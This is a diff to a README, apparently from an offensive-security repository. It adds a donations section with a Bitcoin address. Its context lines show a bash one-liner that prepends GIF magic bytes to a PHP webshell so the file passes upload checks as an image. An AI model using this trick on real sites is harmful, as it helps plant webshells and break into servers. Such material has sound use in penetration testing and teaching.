@@ -32,3 +32,11 @@ Here's a bash/zsh one liner to make a php file look like a gif file:
 ```bash
 echo -n -e '\x47\x49\x46\x38\x37\x61' | cat - /path/to/php-webshell.php > image.gif
 ```
+
+---
+
+## Donations
+
+If you think my work helped you in some way saving you time and effort, I am happy to receive any amount of donation. However, the code in this repo is completely free.
+
+Bitcoin (BTC): `bc1qzlhpm94vtk2ht67etdutzcy2g5an5v6g36tp0m`
